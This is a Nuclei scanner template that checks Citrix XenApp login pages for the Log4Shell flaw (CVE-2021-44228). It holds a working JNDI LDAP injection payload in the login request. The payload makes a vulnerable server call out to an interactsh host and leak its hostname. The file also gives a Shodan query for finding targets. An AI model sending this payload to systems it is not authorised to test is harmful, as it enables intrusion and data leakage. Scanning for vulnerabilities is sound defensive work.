http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'POST /Citrix/XenApp/auth/login.aspx HTTP/1.1

    Host: {{Hostname}}

    Cookie: WIClientInfo="clientConnSecure#false";

    Origin: {{RootURL}}

    Referer: {{RootURL}}/Citrix/XenApp/auth/login.aspx?CTX_MessageType=WARNING&CTX_MessageKey=NoUsableClientDetected

    Content-Type: application/x-www-form-urlencoded


    LoginType=Explicit&user=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}

    '
id: citrix-xenapp-log4j-rce
info:
  author: shaikhyaser
  classification:
    cpe: cpe:2.3:a:citrix:xenapp:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'Citrix XenApp is susceptible to Log4j JNDI remote code execution.
    Citrix Virtual Apps is an application virtualization software produced by Citrix
    Systems that allows Windows applications to be accessed via individual devices
    from a shared server or cloud system.

    '
  metadata:
    max-request: 1
    product: xenapp
    shodan-query: html:"/citrix/xenapp"
    vendor: citrix
  name: Citrix XenApp - Remote Code Execution (Apache Log4j)
  reference:
  - https://support.citrix.com/article/CTX335705
  severity: critical
  tags: cve,cve2021,rce,jndi,log4j,citrix,oast,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
  str: '{{rand_base(5)}}'
